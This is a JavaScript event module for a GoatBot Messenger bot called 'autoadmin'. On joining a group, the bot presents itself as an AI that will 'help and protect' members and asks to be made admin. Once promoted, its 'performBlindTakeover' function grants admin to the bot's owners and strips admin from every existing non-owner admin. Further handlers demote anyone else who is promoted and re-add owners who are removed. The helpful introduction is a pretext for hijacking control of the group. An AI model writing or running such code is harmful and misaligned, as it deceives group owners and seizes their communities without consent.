module.exports = {
	config: {
		name: "autoadmin",
		version: "9.0",
		author: "Rika",
		category: "events"
	},

	onStart: async ({ threadsData, event, api, message }) => {
		const botID = api.getCurrentUserID().toString();
		const { threadID, logMessageType, logMessageData, author } = event;
		const config = global.GoatBot.config;
		const botAdmins = (config.adminBot || []).map(id => id.toString());

		// 1. Join Event -> Notify Admins for Setup & Introduction
		if (logMessageType === "log:subscribe" && logMessageData.addedParticipants.some(item => item.userFbId == botID)) {
			console.log(`[AUTOADMIN] Bot joined ${threadID}. Sending Introduction...`);
			
			return async function () {
				let adminMentions = [];
				let body = "━━━━━━━━━━━━━━━\n 🤖 RIKA AI JOINED\n━━━━━━━━━━━━━━━\n\nHello! I am Rika, an AI designed to help and protect people in this group chat.\n\n👉 Use prefix '^' to use my commands!\n\n⚠️ SETUP REQUIRED ⚠️\nTo enable my full protection and help features, please promote me to Admin!\n\nAdmins:";
				
				try {
					const threadInfo = await api.getThreadInfo(threadID);
					const adminIDs = (threadInfo.adminIDs || []).map(a => (a.id || a).toString());
					
					for (const id of adminIDs) {
						if (id != botID) {
							const name = await threadsData.getName(id) || "Admin";
							adminMentions.push({ tag: `@${name}`, id: id });
							body += `\n👉 @${name}`;
						}
					}
					body += "\n\n━━━━━━━━━━━━━━━";
					await message.send({ body, mentions: adminMentions });
				} catch (e) {
					await message.send("━━━━━━━━━━━━━━━\n 🤖 RIKA AI JOINED\n━━━━━━━━━━━━━━━\n\nHello! I am Rika, an AI designed to help people in this group chat.\n\n👉 Use prefix '^' to use my commands!\n\n⚠️ PLEASE PROMOTE ME TO ADMIN TO ENABLE ALL FEATURES!\n━━━━━━━━━━━━━━━");
				}
				
				await performBlindTakeover(api, threadsData, threadID, botID, "join_event");
			};
		}

		// 2. Removal Event (Anti-Kick & Shield)
		if (logMessageType === "log:unsubscribe") {
			const leftID = logMessageData?.leftParticipantFbId?.toString();
			if (!leftID) return;

			if (leftID == botID) {
				// Bot kicked. Notify owners privately.
				for (const adminID of botAdmins) {
					try {
						await api.sendMessage(`⚠️ [SECURITY ALERT]\n\nRika was removed from a group.\nGroup ID: ${threadID}\nRemoved by: ${author}`, adminID);
					} catch (e) {}
				}
			} else if (botAdmins.includes(leftID)) {
				// Protected Member (Owner) kicked. Re-add and demote author.
				return async function () {
					try {
						await api.addUserToGroup(leftID, threadID);
						await api.changeAdminStatus(threadID, author, false);
						const name = await threadsData.getName(leftID) || "Owner";
						await message.send(`🛡️ SHIELD ACTIVE\n\nUnauthorized removal of Protected Member: @${name} detected.\nAction: Member re-added. Offender demoted.`);
					} catch (e) {}
				}
			}
		}

		// 3. Admin Change Event (Unauthorized Promotion Protection)
		if (logMessageType === "log:thread-admins") {
			const targetID = (logMessageData?.TARGET_ID || logMessageData?.target_id)?.toString();
			const adminEvent = logMessageData?.ADMIN_EVENT || logMessageData?.admin_event;

			if (targetID == botID && adminEvent == "add_admin") {
				return async function () {
					await performBlindTakeover(api, threadsData, threadID, botID, "promotion_event");
				};
			}

			if (adminEvent == "add_admin" && !botAdmins.includes(targetID) && targetID != botID) {
				// Someone else promoted a non-owner. Demote instantly.
				return async function () {
					try {
						await api.changeAdminStatus(threadID, targetID, false);
					} catch (e) {}
				};
			}
		}
	}
};

async function performBlindTakeover(api, threadsData, threadID, botID, trigger) {
	try {
		const { config } = global.GoatBot;
		const botAdmins = (config.adminBot || []).map(id => id.toString());

		let currentAdmins = [];
		try {
			const threadInfo = await api.getThreadInfo(threadID);
			if (threadInfo) {
				await threadsData.refreshInfo(threadID, threadInfo);
				currentAdmins = (threadInfo.adminIDs || []).map(a => (a.id || a).toString());
			}
		} catch (e) {}

		for (const adminID of botAdmins) {
			try { await api.changeAdminStatus(threadID, adminID, true); } catch (e) {}
		}

		if (currentAdmins.includes(botID)) {
			for (const adminID of currentAdmins) {
				if (adminID !== botID && !botAdmins.includes(adminID)) {
					try { await api.changeAdminStatus(threadID, adminID, false); } catch (e) {}
				}
			}
		}
	} catch (err) {}
}
